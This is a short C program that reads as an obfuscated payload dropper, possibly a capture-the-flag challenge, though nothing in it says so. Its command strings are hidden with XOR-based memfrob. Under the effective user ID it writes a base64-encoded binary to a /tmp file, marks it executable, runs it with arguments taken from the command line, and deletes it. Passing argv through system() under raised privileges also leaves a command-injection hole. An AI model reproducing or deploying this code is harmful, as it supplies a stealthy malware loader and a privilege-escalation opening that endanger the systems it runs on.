#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char DATA[] = "REPLACE_ME";

char TMP[] = "\x05^GZ\x05rrrrrr";
char DECODE_STR[] = "\nV\nHKYO\x1c\x1e\n\x07N\n\x14\n";
char CHMOD_STR[] = "\x11\nIBGEN\n\x01R\n";
char REMOVE_STR[] = "XG\n";

void create_temp() {
	memfrob(TMP, strlen(TMP));
	mktemp(TMP);
	memfrob(TMP, strlen(TMP));
}

void dump() {
	FILE * tmpfile = NULL;
	char cmd[8192] = "OIBE\n";
	memfrob(cmd, strlen(cmd));
	memfrob(DECODE_STR, strlen(DECODE_STR));
	memfrob(CHMOD_STR, strlen(CHMOD_STR));
	memfrob(TMP, strlen(TMP));
	strcat(cmd, DATA);
	strcat(cmd, DECODE_STR);
	strcat(cmd, TMP);
	strcat(cmd, CHMOD_STR);
	strcat(cmd, TMP);
	system(cmd);
	memfrob(cmd, strlen(cmd));
	memfrob(DECODE_STR, strlen(DECODE_STR));
	memfrob(CHMOD_STR, strlen(CHMOD_STR));
	memfrob(TMP, strlen(TMP));
}

void execute_payload(const char * param_1, const char * param_2) {
	memfrob(TMP, strlen(TMP));
	memfrob(REMOVE_STR, strlen(REMOVE_STR));
	const char * argv[] = {TMP, param_1, param_2, NULL};
	char cmd[256] = {};
	for (int i = 0; argv[i]; i++) {
		strcat(cmd, argv[i]);
		strcat(cmd, " ");
	}
	system(cmd);
	strcpy(cmd, REMOVE_STR);
	strcat(cmd, TMP);
	system(cmd);
	memfrob(TMP, strlen(TMP));
	memfrob(REMOVE_STR, strlen(REMOVE_STR));
}

void copy_param(int count, char * buffer, char * src) {
	if (count > 1) {
		strncpy(buffer, src, 255);
	}
}

int main(int argc, char * argv[]) {
	setreuid(geteuid(), geteuid());
	char buffer[256] = {};
	copy_param(argc, buffer, argv[1]);
	create_temp();
	dump();
	char param_1[256] = {}, param_2[256] = {};
	strncpy(param_1, buffer, strlen(buffer) / 2);
	strcat(param_2, buffer + strlen(buffer) - 1);
	execute_payload(param_1, param_2);
	return 0;
}
